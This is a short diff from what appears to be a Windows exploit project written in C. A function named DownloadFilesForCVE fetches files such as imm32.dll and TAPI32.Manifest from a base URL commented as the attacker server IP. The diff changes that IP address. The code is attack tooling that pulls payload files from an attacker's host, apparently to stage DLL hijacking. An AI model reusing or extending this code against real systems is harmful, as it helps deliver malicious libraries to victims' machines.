@@ -243,7 +243,7 @@ BOOL DownloadFile(LPCSTR url, LPCSTR localFile) {
 
 // Download Specific Files
 void DownloadFilesForCVE() {
-	const char* baseUrl = "http://192.168.206.8/"; // Change as per attacker server ip
+	const char* baseUrl = "http://192.168.29.245/"; // Change as per attacker server ip
 	const char* files[] = {
 		"imm32.dll",
 		"TAPI32.Manifest",
